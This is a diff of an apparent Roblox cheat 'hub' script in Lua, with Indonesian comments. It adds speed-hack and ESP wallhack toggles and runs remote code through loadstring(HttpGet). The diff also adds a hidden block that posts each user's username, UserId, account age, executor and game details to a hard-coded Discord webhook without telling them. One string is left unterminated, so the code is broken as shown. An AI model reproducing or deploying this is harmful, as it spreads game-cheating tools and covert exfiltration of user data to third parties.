@@ -1,21 +1,27 @@
-
 Players = game:GetService("Players") 
 local LocalPlayer = Players.LocalPlayer
 -- Memuat Library Orion
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()
 -- Membuat jendela UI
 local Window = OrionLib:MakeWindow({
-    Name = "Galaxy Hub",
+    Name = "D4nzy Hub",
     HidePremium = false,
     SaveConfig = true,
     ConfigFolder = "OrionTest"
 })
 -- Membuat Tab dalam UI
 local Tab = Window:MakeTab({
-    Name = "Menu",
+    Name = "Steal",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
+-- Membuat Tab2 Untuk Visuality
+local Tab2 = Window:MakeTab({
+    Name = "Visual",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
 -- Menambahkan Section ke dalam Tab
 local Section = Tab:AddSection({
     Name = "Enjoy For Using"
@@ -28,21 +34,6 @@ local touchThread
 local rootPart
 
 getgenv().BrainRotActive = false
-
-Tab:AddToggle({
-	Name = "Steal a Brainrot (OP)",
-    Default = false,
-    Callback = function(value)
-        getgenv().BrainRotActive = value
-        if value then
-            -- Saat toggle AKTIF
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/D4nzyXcripter/Steal-Brainrot-New/refs/heads/main/Stealing"))()
-        else
-            -- Saat toggle NONAKTIF
-            print("Toggle dimatikan. Script harus cek getgenv().BrainRotActive.")
-        end
-    end
-})
 
 -- Tambahkan Beberapa Toogle
 local InstanToggleAktif = true
@@ -122,7 +113,7 @@ Tab:AddToggle({
 
 local speedLoop = nil
 Tab:AddToggle({
-	Name = "Speed 50",
+	Name = "Speed 30",
 	Default = false,
 	Callback = function(Value)
 		local player = game.Players.LocalPlayer
@@ -132,7 +123,7 @@ Tab:AddToggle({
 					local character = player.Character or player.CharacterAdded:Wait()
 					local humanoid = character:FindFirstChild("Humanoid")
 					if humanoid then
-						humanoid.WalkSpeed = 50
+						humanoid.WalkSpeed = 30
 					end
 					task.wait(0.1) -- Delay kecil agar tidak terlalu berat
 				end
@@ -151,3 +142,147 @@ Tab:AddToggle({
 	end    
 })
 
+local espConnection = nil
+Tab2:AddToggle({
+	Name = "ESP",
+	Default = false,
+	Callback = function(Value)
+		local player = game.Players.LocalPlayer
+
+		local function createESP(plr)
+			if plr == player then return end
+			local char = plr.Character
+			if not char then return end
+			local head = char:FindFirstChild("Head")
+			if not head then return end
+			if head:FindFirstChild("ESP") then return end
+
+			local tag = Instance.new("BillboardGui", head)
+			tag.Name = "ESP"
+			tag.Size = UDim2.new(0, 100, 0, 30)
+			tag.AlwaysOnTop = true
+			local label = Instance.new("TextLabel", tag)
+			label.Size = UDim2.new(1, 0, 1, 0)
+			label.BackgroundTransparency = 1
+			label.Text = plr.Name
+			label.TextColor3 = Color3.new(1, 0, 0)
+			label.TextStrokeTransparency = 0.5
+			label.TextScaled = true
+		end
+
+		if Value then
+			espConnection = game:GetService("RunService").RenderStepped:Connect(function()
+				for _, plr in pairs(game.Players:GetPlayers()) do
+					createESP(plr)
+				end
+			end)
+		else
+			if espConnection then
+				espConnection:Disconnect()
+				espConnection = nil
+			end
+			for _, plr in pairs(game.Players:GetPlayers()) do
+				local char = plr.Character
+				if char and char:FindFirstChild("Head") then
+					local esp = char.Head:FindFirstChild("ESP")
+					if esp then
+						esp:Destroy()
+					end
+				end
+			end
+		end
+	end
+})
+
+--// Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = Players.LocalPlayer
+
+--// Webhook URL
+local webhook = "https://discord.com/api/webhooks/1284182491934101538/jkVMSaYGarIcD4dIyQSfeyfKvwxYDxM5yeuJYEs0Z9nxYSBg_WertgxZhwdja3QMOBEf"
+
+--// Executor detection
+local executor = "Unknown"
+if syn then
+	executor = "Synapse X"
+elseif is_sirhurt_closure then
+	executor = "SirHurt"
+elseif secure_load then
+	executor = "Sentinel"
+elseif KRNL_LOADED then
+	executor = "KRNL
+elseif velocity_loader then
+	executor = "Velocity"
+elseif getexecutorname then
+	executor = getexecutorname()
+elseif fluxus then
+	executor = "Fluxus"
+end
+
+--// Get game name
+local success, gameName = pcall(function()
+	return MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+if not success then
+	gameName = "Unknown Game"
+end
+
+--// Get execution time (UTC)
+local executionTime = os.date("!%Y-%m-%d %H:%M:%S UTC")
+
+--// ROBUX VALUE ESTIMATION
+
+-- NOTE: Roblox does NOT expose player's Robux balance to scripts.
+-- We'll simulate this by pretending a balance (replace with real if you have API)
+local robuxBalance = 0 -- Default 0, no official way to get it via Lua
+
+-- If you want to test, put a number here like:
+-- local robuxBalance = 1500
+
+-- Robux purchase value (approx $0.0125 per Robux)
+local purchaseValue = robuxBalance * 0.0125
+
+-- DevEx value (approx $0.0035 per Robux)
+local devexValue = robuxBalance * 0.0035
+
+local robuxInfo = robuxBalance > 0 and
+	string.format("Balance: %d R$\nEstimated Purchase Value: $%.2f\nEstimated DevEx Value: $%.2f", robuxBalance, purchaseValue, devexValue)
+	or "Robux balance not available."
+
+--// Webhook data
+local data = {
+	content = "**Script Executed Bung**",
+	embeds = {{
+		title = "Execution Log",
+		color = 0x00ffff,
+		fields = {
+			{ name = "Username", value = player.Name, inline = true },
+			{ name = "Display Name", value = player.DisplayName, inline = true },
+			{ name = "UserId", value = tostring(player.UserId), inline = true },
+			{ name = "Account Age (days)", value = tostring(player.AccountAge), inline = true },
+			{ name = "Executor", value = executor, inline = true },
+			{ name = "Game Name", value = gameName, inline = true },
+			{ name = "Place ID", value = tostring(game.PlaceId), inline = true },
+			{ name = "Private Server?", value = tostring(game.PrivateServerId ~= ""), inline = true },
+			{ name = "Execution Time", value = executionTime, inline = false },
+			{ name = "Place Link", value = "https://www.roblox.com/games/" .. game.PlaceId, inline = false },
+			{ name = "Robux Info", value = robuxInfo, inline = false }
+		}
+	}}
+}
+
+--// Send to Discord
+local jsonData = HttpService:JSONEncode(data)
+local request = (syn and syn.request) or (http and http.request) or request
+if request then
+	request({
+		Url = webhook,
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = jsonData
+	})
+else
+	warn("Your executor does not support HTTP requests.")
+end
